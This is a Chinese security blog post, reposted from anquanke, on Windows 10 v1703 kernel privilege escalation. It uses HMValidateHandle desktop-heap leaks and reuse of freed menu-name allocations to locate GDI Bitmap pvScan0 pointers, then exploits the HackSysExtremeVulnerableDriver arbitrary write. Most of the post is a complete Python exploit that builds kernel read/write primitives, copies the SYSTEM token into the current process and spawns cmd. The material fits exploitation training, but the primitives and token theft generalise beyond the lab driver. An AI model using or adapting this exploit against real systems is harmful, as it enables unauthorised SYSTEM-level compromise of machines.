> 原文链接: https://www.anquanke.com//post/id/168441 


# Windows10 v1703基于桌面堆泄露的内核提权技术


                                阅读量   
                                **221883**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01f4a58ca6cf0d7247.jpg)](https://p1.ssl.qhimg.com/t01f4a58ca6cf0d7247.jpg)



## 0x001 前言

在开始讨论Windows10 v1703内核提权技术之前，先来了解一下微软为阻止Win10权限提升所作的努力：

1.在Win10 v1511、v1607、1703几个版本提权过程，都需要用到Bitmap object这个数据结构，而这个object有一个最重要的pvScan0指针成员。Bitmap是一种位图数据结构，了解过GDI+编程的应该不会陌生，pvScan0指针成员则指向Bitmap object中的Pixel区域（像素区）。

2.微软在关于Bitmap object的操作上给出了部分API，值得注意的是SetBitmapBits和GetBitmapBits。本来正常应用到编程中的确是相安无事，但我们来考虑一下，要是其中某个Bitmap object的pvScan0指针成员胡乱指向一个内核地址，当调用GetBitmapBits便能读到该处数据（信息泄露），而当调用SetBitmapBits便能向该处写入数据（任意写）。

3.为了阻止Bitmap object被利用，微软多番努力阻止pvScan0内核地址的泄露，从而阻断整个攻击过程。在v1511版本，可以利用GDI_CELL结构成员pKernelAddress泄露出pvScan0的内核地址，而在v1607该处便被置空了，但攻击并未就此停止，采用UAF的攻击手法，便能准确预测pvScan0的内核地址，这里需要用到一个pHead的数据成员。

4.在v1703版本中，pHead再次被置空，以往的攻击手段失效，该文就是基于这样的背景，讨论Win10 v1703内核权限提升技术。

关于v1511、v1607的详细分析可以参考这两篇文章

[Windows特权提升：GDI Bitmap滥用 ](https://www.anquanke.com/post/id/156519)

[Windows10 v1607内核提权技术的发展——利用AcceleratorTable](https://www.anquanke.com/post/id/168356)



## 0x002 调试环境

虚拟机：Windows 10 x64 1703 Jul 2017

主机：Windows 10 x64 1709 Dec 2017

环境搭建可以参考该文：

[Part 10: Kernel Exploitation -&gt; Stack Overflow](http://www.fuzzysecurity.com/tutorials/expDev/14.html)



## 0x003 Test POC

这里说一下，后面会用到HEVD的一个Windows Kernel Exploition训练项目

[HackSysExtremeVulnerableDriver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)

还需要一个驱动装载工具，用于注册HEVD编译出来的.sys驱动文件

[OSRloader](https://www.osronline.com/article.cfm?article=157)

用该脚本来触发ArbraryWrite这个洞

```
import sys
from ctypes import *

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\.HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)

if not hevDevice or hevDevice == -1:
    print "[-] Couldn't get Device Driver handle."
    sys.exit(0)
buf = "A"*8 + "B"*8
buflen = len(buf)

kernel32.DeviceIoControl(hevDevice,0x22200B,buf,buflen,None,0,byref(c_ulong()),None)
```

windbg显示这样，将内容`0x4141414141414141`往地址`0x4242424242424242`上写入

```
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
[+] UserWriteWhatWhere: 0x0000000002090E18
[+] WRITE_WHAT_WHERE Size: 0x10
[+] UserWriteWhatWhere-&gt;What: 0x4141414141414141
[+] UserWriteWhatWhere-&gt;Where: 0x4242424242424242
[+] Triggering Arbitrary Overwrite
[-] Exception Code: 0xC0000005
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
```



## 0x004 How to Exploit it?

还是回到最主要的一个问题：如何取得pvScan0的内核地址？

很幸运，在Windows 10 1703上还有另外的方法帮助我们预测pvscan0指针的内核地址，通过合理构造，准确性能够提高到100%。但首先的，我们要得到HMValidateHandle的调用地址。

HmValidateHandle比较有意思，我们只需给它提供一个窗口句柄，然后它就会将在桌面堆中的tagWND对象指针返回回来，拿到该指针就相当于完成了内核信息泄露

先去找到user32.IsMenu方法

```
kd&gt; u user32!IsMenu
USER32!IsMenu:
00007fff`17d489e0 4883ec28        sub     rsp,28h
00007fff`17d489e4 b202            mov     dl,2
00007fff`17d489e6 e805380000      call    USER32!HMValidateHandle (00007fff`17d4c1f0)
00007fff`17d489eb 33c9            xor     ecx,ecx
00007fff`17d489ed 4885c0          test    rax,rax
00007fff`17d489f0 0f95c1          setne   cl
00007fff`17d489f3 8bc1            mov     eax,ecx
00007fff`17d489f5 4883c428        add     rsp,28h

```

注意到指向HMValidateHandle指针的偏移的位于第一个0xe8字节码之后

在user32.IsMenu开头对每个字节进行比较，看看是否为0xe8，获取到这个偏移数值

```
def findHMValidateHandle():
    global pHMValidateHandle

    kernel32.LoadLibraryA.restype = HMODULE
    hUser32 = kernel32.LoadLibraryA("user32.dll")

    kernel32.GetProcAddress.restype = c_ulonglong
    kernel32.GetProcAddress.argtypes = (HMODULE,LPCSTR)
    pIsMenu = kernel32.GetProcAddress(hUser32,"IsMenu")
    debug_print("[&gt;] Locating HMValidateHandle()")
    debug_print("t[+] user32.IsMenu: 0x%X" % pIsMenu)

    offset = 0
    pHMValidateHandle_offset = 0
    while(offset &lt; 0x100):
        byte = cast(pIsMenu + offset, POINTER(c_byte))
        # if byte == 0xE8(232 - 128 - 128 = -24)
        if byte.contents.value == -24:
            pHMValidateHandle_offset = pIsMenu + offset + 1
            break;
        offset = offset + 1
    debug_print("t[+] Pointer to HMValidateHandle offset: 0x%X" % pHMValidateHandle_offset)

    HMValidateHandle_offset = (cast(pHMValidateHandle_offset, POINTER(c_long))).contents.value
    debug_print("t[+] HMValidateHandle offset: 0x%X" % HMValidateHandle_offset)

    # Add 0xb because relative offset of call starts from next instruction after call, which is 0xb bytes from start of user32.IsMenu
    pHMValidateHandle = pIsMenu + HMValidateHandle_offset + 0xb
    debug_print("t[+] HMValidateHandle pointer: 0x%X" % pHMValidateHandle)
```

然后引用一张Fuzzysecurity的原图来演示如何通过`HmValidateHandle`返回的tagWND对象指针，一步一步拿到`lpszMenuName`的内核地址，而`lpszMenuName`指向paged pool(存放着菜单名)

[![](https://p5.ssl.qhimg.com/t01b114c935e14346e0.jpg)](https://p5.ssl.qhimg.com/t01b114c935e14346e0.jpg)

主要过程：

```
pIsMenu --&gt; pHMValidateHandle --&gt; pWnd = HMValidateHandle(hWnd,1)，返回tagWND对象指针，用户桌面堆地址 
--&gt; pSelf=pWnd+0x20，得到内核桌面堆地址、kernelTagCLS=pWnd+0xa8，得到内核TagCLS地址
--&gt; ulClientDelta=pSelf-pWnd，这是桌面堆用户模式映射与内核映射的偏移
--&gt; userTagCLS=kernelTagCLS-ulClientDelta，取得用户TagCLS地址，lpszMenuName位于0x90偏移处(该处指向paged pool)
```

关于桌面堆的分析这里不展开，参考该文：

[Desktop Heap Overview](https://blogs.msdn.microsoft.com/ntdebugging/2007/01/04/desktop-heap-overview/)

现在先分配一个比较长的窗口窗口菜单名，再释放掉，然后再申请一个Bitmap将会从用刚才释放的块，这是因为窗口菜单名lpszMenuName与Bitmap分配的块位于同一个内存池。

虽说这样做是没什么毛病，但如何确保我们一定能够重用释放掉的块呢？

其实可以通过比较新申请到的块与先前释放的块的lpszMenuName成员，这样，Bitmap对象的内核地址完全能够预测出来。

```
def alloc_free_windows():
    global classNumber

    previous_entry = 0

    while (1):
        plpszMenuName = allocate_free_window()
        if previous_entry == plpszMenuName:
            return plpszMenuName
        previous_entry = plpszMenuName
        classNumber = classNumber + 1
```

下面再来简单地说一下后续利用过程：

1.依次分配hManager、hWorker两个Bitmap object，并利用上述方法预测得到各自pvscan0指针的内核地址；

2.将hManager的pvScan0指针指向hWorker的pvScan0指针的存放地址，利用HEVD模块的任意写漏洞；

3.查询获得当前进程与system进程的token；

4.调用API SetBitmapBits、GetBitmapBits，将system进程的token写入当前进程；

注意一下查看几个重要的偏移，EXP要相应的修改一下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ed98843b55bf92de.png)

得到HMValidateHandle调用地址

[![](https://p3.ssl.qhimg.com/t011ab78fe13989455b.png)](https://p3.ssl.qhimg.com/t011ab78fe13989455b.png)

利用UAF令Bitmap重新分配得到lpszMenuName释放的内存，成功预测到pvScan0成员指针地址

[![](https://p2.ssl.qhimg.com/t013226913a71081f78.png)](https://p2.ssl.qhimg.com/t013226913a71081f78.png)



## Exploit it!

完整的EXP

```
import sys,time,struct,ctypes,os
from ctypes import *
from ctypes.wintypes import *
from subprocess import *
from win32com.shell import shell
import win32con

kernel32 = windll.kernel32
gdi32 = windll.gdi32
ntdll = windll.ntdll
user32 = windll.user32

hManager = HBITMAP()
hWorker = HBITMAP()

classNumber = 0


class PEB(Structure):
    _fields_ = [("Junk", c_byte * 0xF8),
                ("GdiSharedHandleTable", c_void_p)]

class PROCESS_BASIC_INFORMATION(Structure):
    _fields_ = [("Reserved1", LPVOID),
                ("PebBaseAddress", POINTER(PEB)),
                ("Reserved2", LPVOID * 2),
                ("UniqueProcessId", c_void_p),
                ("Reserved3", LPVOID)]

class SYSTEM_MODULE_INFORMATION(Structure):
    _fields_ = [("Reserved", c_void_p * 2),
                ("ImageBase", c_void_p), 
                ("ImageSize", c_long),
                ("Flags", c_ulong),
                ("LoadOrderIndex", c_ushort),
                ("InitOrderIndex", c_ushort),
                ("LoadCount", c_ushort),
                ("ModuleNameOffset", c_ushort),
                ("FullPathName", c_char * 256)]

WNDPROCTYPE = WINFUNCTYPE(c_int, HWND, c_uint, WPARAM, LPARAM)

class WNDCLASSEX(Structure):
    _fields_ = [("cbSize", c_uint),
                ("style", c_uint),
                ("lpfnWndProc", WNDPROCTYPE),
                ("cbClsExtra", c_int),
                ("cbWndExtra", c_int),
                ("hInstance", HANDLE),
                ("hIcon", HANDLE),
                ("hCursor", HANDLE),
                ("hBrush", HANDLE),
                ("lpszMenuName", LPCWSTR),
                ("lpszClassName", LPCWSTR),
                ("hIconSm", HANDLE)]


def hang():
    kernel32.DebugBreak()
    kernel32.DebugBreak()

    while True:
        time.sleep(60*60*24)

def debug_print(message):
    print message
    kernel32.OutputDebugStringA(message + "n")

def findHMValidateHandle():
    global pHMValidateHandle

    kernel32.LoadLibraryA.restype = HMODULE
    hUser32 = kernel32.LoadLibraryA("user32.dll")

    kernel32.GetProcAddress.restype = c_ulonglong
    kernel32.GetProcAddress.argtypes = (HMODULE,LPCSTR)
    pIsMenu = kernel32.GetProcAddress(hUser32,"IsMenu")
    debug_print("[&gt;] Locating HMValidateHandle()")
    debug_print("t[+] user32.IsMenu: 0x%X" % pIsMenu)

    offset = 0
    pHMValidateHandle_offset = 0
    while(offset &lt; 0x100):
        byte = cast(pIsMenu + offset, POINTER(c_byte))
        # if byte == 0xE8
        if byte.contents.value == -24:
            pHMValidateHandle_offset = pIsMenu + offset + 1
            break;
        offset = offset + 1
    debug_print("t[+] Pointer to HMValidateHandle offset: 0x%X" % pHMValidateHandle_offset)

    HMValidateHandle_offset = (cast(pHMValidateHandle_offset, POINTER(c_long))).contents.value
    debug_print("t[+] HMValidateHandle offset: 0x%X" % HMValidateHandle_offset)

    # Add 0xb because relative offset of call starts from next instruction after call, which is 0xb bytes from start of user32.IsMenu
    pHMValidateHandle = pIsMenu + HMValidateHandle_offset + 0xb
    debug_print("t[+] HMValidateHandle pointer: 0x%X" % pHMValidateHandle)

def PyWndProcedure(hWnd, Msg, wParam, lParam):
    """ Callback Function for CreateWindow() """
    # if Msg == WM_DESTROY
    if Msg == 2:
        user32.PostQuitMessage(0)
    else:
        return user32.DefWindowProcW(hWnd, Msg, wParam, lParam)
    return 0

def allocate_free_window():
    """ Allocate and Free a single Window """
    global classNumber, pHMValidateHandle

    # Create prototype for HMValidateHandle()
    HMValidateHandleProto = WINFUNCTYPE(c_ulonglong, HWND, c_int)
    HMValidateHandle = HMValidateHandleProto(pHMValidateHandle)

    WndProc = WNDPROCTYPE(PyWndProcedure)
    hInst = kernel32.GetModuleHandleA(0)

    # instantiate WNDCLASSEX 
    wndClass = WNDCLASSEX()
    wndClass.cbSize = sizeof(WNDCLASSEX)
    wndClass.lpfnWndProc = WndProc
    wndClass.cbWndExtra = 0
    wndClass.hInstance = hInst
    wndClass.lpszMenuName = 'A' * 0x8f0 # Thought 0x7f0 was 0x1000 but did not work, and this does
    wndClass.lpszClassName = "Class_" + str(classNumber)

    # Register Class and Create Window
    hCls = user32.RegisterClassExW(byref(wndClass))
    hWnd = user32.CreateWindowExA(0,"Class_" + str(classNumber),'Franco',0xcf0000,0,0,300,300,0,0,hInst,0)

    # Run HMValidateHandle on Window handle to get a copy of it in userland
    pWnd = HMValidateHandle(hWnd,1)

    # Read pSelf from copied Window
    kernelpSelf = (cast(pWnd+0x20, POINTER(c_ulonglong))).contents.value

    # Calculate ulClientDelta (tagWND.pSelf - HMValidateHandle())
    # pSelf = ptr to object in Kernel Desktop Heap; pWnd = ptr to object in User Desktop Heap
    ulClientDelta = kernelpSelf - pWnd

    # Read tagCLS from copied Window
    kernelTagCLS = (cast(pWnd+0xa8, POINTER(c_ulonglong))).contents.value

    # Calculate user-land tagCLS location: tagCLS - ulClientDelta
    userTagCLS = kernelTagCLS - ulClientDelta

    # Calculate kernel-land tagCLS.lpszMenuName
    tagCLS_lpszMenuName = (cast (userTagCLS+0x90, POINTER(c_ulonglong))).contents.value

    # Destroy Window
    user32.DestroyWindow(hWnd)

    # Unregister Class
    user32.UnregisterClassW(c_wchar_p("Class_" + str(classNumber)), hInst)

    return tagCLS_lpszMenuName

def alloc_free_windows():
    """ Calls alloc_free_window() until current address matches previous one """
    global classNumber

    previous_entry = 0

    while (1):
        plpszMenuName = allocate_free_window()
        if previous_entry == plpszMenuName:
            return plpszMenuName
        previous_entry = plpszMenuName
        classNumber = classNumber + 1

def write_mem(dest, src, length):
    global hManager
    global hWorker

    write_buf = c_ulonglong(dest)
    gdi32.SetBitmapBits(HBITMAP(hManager), c_ulonglong(sizeof(write_buf)), LPVOID(addressof(write_buf)));
    gdi32.SetBitmapBits(HBITMAP(hWorker), c_ulonglong(length), src)

def read_mem(src, dest, length):
    global hManager
    global hWorker

    write_buf = c_ulonglong(src)
    gdi32.SetBitmapBits(HBITMAP(hManager), c_ulonglong(sizeof(write_buf)), LPVOID(addressof(write_buf)));
    gdi32.GetBitmapBits(HBITMAP(hWorker), c_ulonglong(length), dest)

def find_kernelBase(input_modules):
    modules = `{``}`

    # Allocate arbitrary buffer and call NtQuerySystemInformation
    system_information = create_string_buffer(0)
    systeminformationlength = c_ulong(0)
    ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))

    # Call NtQuerySystemInformation second time with right size
    system_information = create_string_buffer(systeminformationlength.value)
    ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))

    # Read first 4 bytes which contains number of modules retrieved
    module_count = c_ulong(0)
    module_count_string = create_string_buffer(system_information.raw[:8])
    ctypes.memmove(addressof(module_count), module_count_string, sizeof(module_count))

    # Marshal each module information and store it in a dictionary&lt;name, SYSTEM_MODULE_INFORMATION&gt;
    system_information = create_string_buffer(system_information.raw[8:])
    for x in range(module_count.value):
        smi = SYSTEM_MODULE_INFORMATION()
        temp_system_information = create_string_buffer(system_information.raw[sizeof(smi) * x: sizeof(smi) * (x+1)])
        ctypes.memmove(addressof(smi), temp_system_information, sizeof(smi))
        module_name =  smi.FullPathName.split('\')[-1]
        modules[module_name] = smi

    #debug_print ("rn[+] NtQuerySystemInformation():")

    # Get base addresses and return them in a list
    base_addresses = []
    for input_module in input_modules:
        try:
            base_address = modules[input_module].ImageBase
            #debug_print ("t[-] %s base address: 0x%X" % (input_module, base_address))
            base_addresses.append(base_address)
        except:
            base_addresses.append(0)

    return base_addresses

def main():
    global hManager
    global hWorker

    hevDevice = kernel32.CreateFileA("\\.\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)

    if not hevDevice or hevDevice == -1:
        print "[-] Couldn't get Device Driver handle."
        sys.exit(0)

    findHMValidateHandle()

    debug_print ("[&gt;] Setting up Manager Bitmap:")
    debug_print ("t[+] Allocating and Freeing Windows")
    dup_address = alloc_free_windows()
    dwReturn = c_void_p()
    gdi32.CreateBitmap.restype = HBITMAP
    hManager = gdi32.CreateBitmap(0x100, 0x6D, 1, 0x1, dwReturn) # Win10x64RS2 size = 0x1020
    debug_print ("t[+] Manager Bitmap handle: 0x%X" % hManager)
    hManager_pvscan0_off = dup_address + 0x50
    debug_print ("t[+] Manager bitmap pvscan0 offset: 0x%X" % hManager_pvscan0_off)

    debug_print ("[&gt;] Setting up Worker Bitmap:")
    debug_print ("t[+] Allocating and Freeing Windows")
    dup_address = alloc_free_windows()
    dwReturn = c_void_p()
    gdi32.CreateBitmap.restype = HBITMAP
    hWorker = gdi32.CreateBitmap(0x100, 0x6D, 1, 0x1, dwReturn) # size = 0x1020
    debug_print ("t[+] Worker Bitmap handle: 0x%X" % hWorker)
    hWorker_pvscan0_off = dup_address + 0x50
    debug_print ("t[+] Worker bitmap pvscan0 offset: 0x%X" % hWorker_pvscan0_off)


    write_where = struct.pack("&lt;Q", hManager_pvscan0_off)
    write_what_object = struct.pack("&lt;Q", hWorker_pvscan0_off)
    write_what_object_ptr = id(write_what_object) + 0x20
    write_what_final = struct.pack("&lt;Q", write_what_object_ptr)
    buf = write_what_final + write_where
    buflen = len(buf)
    kernel32.DeviceIoControl(hevDevice,0x22200B,buf,buflen,None,0,byref(c_ulong()),None)


    kernelImage = "ntoskrnl.exe"
    kernelImageBase = find_kernelBase(kernelImage.split())[0]

    kernel32.LoadLibraryA.restype = HMODULE
    hKernelImage = kernel32.LoadLibraryA(kernelImage)
    print "[+] Module Name                                  : `{`0`}`".format(kernelImage)
    print "[+] Module Base(Userland)                        : `{`0`}`".format(hex(hKernelImage))

    kernel32.GetProcAddress.restype = c_ulonglong
    kernel32.GetProcAddress.argtypes = (HMODULE, LPCSTR)
    PsISP_user_addr = kernel32.GetProcAddress(hKernelImage,"PsInitialSystemProcess")
    print "[+] PsInitialSystemProcess Userland Base Address : `{`0`}`".format(hex(PsISP_user_addr))

    PsISP_kernel_addr_ptr = kernelImageBase + (PsISP_user_addr - hKernelImage)
    print "[+] PsInitialSystemProcess Kernel Base Address   : `{`0`}`".format(hex(PsISP_kernel_addr_ptr))

    PsISP_kernel_addr = c_ulonglong()
    read_mem(PsISP_kernel_addr_ptr, byref(PsISP_kernel_addr), sizeof(PsISP_kernel_addr));
    SYSTEM_EPROCESS = PsISP_kernel_addr.value
    print "[+] SYSTEM EPROCESS                              : `{`0`}`".format(hex(SYSTEM_EPROCESS))


    token_off = 0x358
    unique_process_id_off = 0x2e0
    active_process_links_off = 0x2e8

    flink = c_ulonglong()
    read_mem(SYSTEM_EPROCESS + active_process_links_off, byref(flink), sizeof(flink)); 

    CURRENT_EPROCESS = 0
    while (True):
        unique_process_id = c_ulonglong(0)

        # Adjust EPROCESS pointer for next entry
        EPROCESS = flink.value - unique_process_id_off - 0x8

        read_mem(EPROCESS + unique_process_id_off, byref(unique_process_id), sizeof(unique_process_id));    

        # Check if we're in the current process
        if (os.getpid() == unique_process_id.value):
            CURRENT_EPROCESS = EPROCESS
            break

        read_mem(EPROCESS + active_process_links_off, byref(flink), sizeof(flink)); 

        # If next same as last, we've reached the end
        if (EPROCESS == flink.value - unique_process_id_off - 0x8):
            break
    print "[+] CURRENT EPROCESS                             : `{`0`}`".format(hex(CURRENT_EPROCESS))

    system_token = c_ulonglong()
    read_mem(SYSTEM_EPROCESS + token_off, byref(system_token), sizeof(system_token));
    write_mem(CURRENT_EPROCESS + token_off, byref(system_token), sizeof(system_token));

    Popen("start cmd", shell=True)

if __name__ == "__main__":
    main()

```

WIN~

[![](https://p2.ssl.qhimg.com/t013bd4bb4696c9d266.png)](https://p2.ssl.qhimg.com/t013bd4bb4696c9d266.png)
